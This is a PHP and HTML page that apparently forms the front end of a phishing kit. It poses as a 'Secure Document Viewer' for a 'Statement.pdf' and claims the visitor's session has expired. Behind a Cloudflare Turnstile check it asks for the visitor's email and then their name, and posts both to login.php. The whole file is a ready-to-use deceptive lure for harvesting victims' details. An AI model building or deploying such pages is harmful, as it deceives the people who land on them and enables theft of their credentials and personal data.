<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;
$old_email = $_SESSION['old_email'] ?? '';
$error = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Document Viewer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
/* Global Reset */
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background-color: #111;
    color: #fff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}
.page-wrapper { position: relative; width: 100%; display: flex; justify-content: center; align-items: center; }
.login-card {
    position: relative;
    width: 320px;
    background: #1a1a1a;
    border-radius: 8px;
    padding: 20px 25px 25px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    text-align: center;
}
.doc-icon { width: 50px; height: 50px; margin: 0 auto 10px; display: flex; align-items: center; justify-content: center; }
.doc-icon img { max-width: 100%; max-height: 100%; object-fit: contain; }
.doc-title { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
.doc-subtitle { font-size: 12px; color: #aaa; margin-bottom: 15px; }
.login-error { color: #ff4c4c; font-size: 12px; margin-bottom: 10px; }
.login-form { display: flex; flex-direction: column; gap: 12px; }
.field-wrapper input {
    width: 100%;
    padding: 10px 12px;
    border-radius: 4px;
    border: 1px solid #555;
    background: #222;
    color: #fff;
    font-size: 14px;
    outline: none;
}
.field-wrapper input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px rgba(26,115,232,0.5); }
.btn-primary {
    padding: 10px 0;
    background: #1a73e8;
    color: #fff;
    font-size: 14px;
    font-weight: 500;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: 0.2s;
}
.btn-primary:hover { background: #185abc; }
.cf-turnstile { transform: scale(0.9); transform-origin: 0 0; margin-bottom:6px; }
@media(max-width: 400px){ .login-card { width: 90%; padding: 18px; } .doc-title { font-size: 15px; } }
</style>
</head>
<body>
<div class="page-wrapper">
  <div class="login-card">
    <div class="doc-icon"><img src="assets/PDtrans.png" alt="PDF Icon"></div>
    <h2 class="doc-title">Statement.pdf</h2>
    <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
    <?php if($error): ?>
      <p class="login-error"><?= htmlspecialchars($error) ?></p>
    <?php endif; ?>

    <?php if($step==1): ?>
      <!-- STEP 1: Email + Turnstile -->
      <form class="login-form" method="POST" action="login.php">
        <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
        <div class="field-wrapper">
          <input type="email" name="email" value="<?= htmlspecialchars($old_email) ?>" placeholder="Enter your email" required>
        </div>
        <button type="submit" class="btn-primary">Next</button>
      </form>
    <?php else: ?>
      <!-- STEP 2: Name -->
      <form class="login-form" method="POST" action="login.php">
        <div class="field-wrapper">
          <input type="text" name="name" placeholder="Enter your name" required>
        </div>
        <button type="submit" class="btn-primary">Next</button>
      </form>
    <?php endif; ?>
  </div>
</div>
</body>
</html>
